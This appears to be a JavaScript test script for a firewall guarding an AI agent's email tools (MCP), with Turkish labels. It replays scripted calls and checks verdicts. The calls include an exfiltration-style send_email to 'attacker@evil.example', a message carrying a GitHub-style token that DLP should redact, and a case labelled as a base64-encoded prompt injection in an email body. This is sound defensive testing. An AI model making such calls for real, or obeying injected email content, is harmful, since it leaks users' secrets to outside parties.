import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { MODEL, printAudit, readAudit, runFirewall, table, verdict, writePolicy } from './_lib.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const { policy, audit } = writePolicy(here, 'mail', [
  'tools:',
  '  default: allow',
  '  rules:',
  '    - match: send_email',
  '      action: allow',
  '      arguments:',
  '        to:',
  "          allow: ['@ourcorp\\.com$']",
  'decoding: { enabled: true }',
  'pinning: { enabled: false }',
  'dlp: { enabled: true, action: redact }',
  'ml:', '  enabled: true', `  model: ${JSON.stringify(MODEL)}`,
  '  threshold: 0.3', '  scan: { toolResults: block }',
]);

const steps = [
  { id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'mail', version: '1' } } },
  { method: 'notifications/initialized' },
  { id: 2, method: 'tools/list' },
  { id: 10, method: 'tools/call', params: { name: 'read_email', arguments: { id: 1 } } },
  { id: 11, method: 'tools/call', params: { name: 'read_email', arguments: { id: 2 } } },
  { id: 12, method: 'tools/call', params: { name: 'send_email', arguments: { to: 'ayse@ourcorp.com', subject: 'durum', body: 'Dağıtım tamam, her şey yeşil.' } } },
  { id: 13, method: 'tools/call', params: { name: 'send_email', arguments: { to: 'attacker@evil.example', subject: 'keys', body: 'buyurun' } } },
  { id: 14, method: 'tools/call', params: { name: 'send_email', arguments: { to: 'ayse@ourcorp.com', subject: 'key', body: 'deploy anahtarı ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8' } } },
];

const { byId } = await runFirewall({ name: 'email', server: join(here, 'mail-server.mjs'), policy, steps });
// The outbound secret is redacted on the request side; the ack result looks clean, so read it from the audit.
const outMask = readAudit(audit).some((e) => e.verdict === 'redact' && /argument/.test(e.reason ?? '')) ? 'MASKELENDİ' : verdict(byId[14]);
console.log('=== E-posta MCP ===\n');
table([
  ['read_email #1', 'sıradan e-posta', verdict(byId[10])],
  ['read_email #2', 'gövdede base64 injection → decode+ML', verdict(byId[11])],
  ['send_email → @ourcorp', 'iç alıcı, zararsız', verdict(byId[12])],
  ['send_email → evil.example', 'harici alıcı → politika', verdict(byId[13])],
  ['send_email (token içeren)', 'giden metinde secret → DLP', outMask],
]);
printAudit(audit);
